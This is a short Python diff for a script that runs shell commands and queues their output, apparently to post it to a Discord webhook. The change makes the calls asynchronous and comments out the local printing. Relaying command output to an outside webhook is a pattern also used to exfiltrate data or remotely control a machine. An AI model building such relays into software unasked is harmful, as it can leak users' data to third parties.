@@ -8,8 +8,8 @@ webhook = discord_webhook.Webhook("https://discord.com/api/webhooks/113141340459
 q = queue.Queue()
 
 async def asyncio_main(cmd):
-    execute_bash_command(cmd)
-    send_loop()
+    asyncio.ensure_future(execute_bash_command(cmd))
+    asyncio.ensure_future(send_loop())
 
 
 async def execute_bash_command(command):
@@ -26,7 +26,7 @@ async def execute_bash_command(command):
             break
         if output:
             out = str(output.strip())
-            print(out)
+            #print(out)
             q.put(f"```json\n{out}```")
             
     return process.poll()
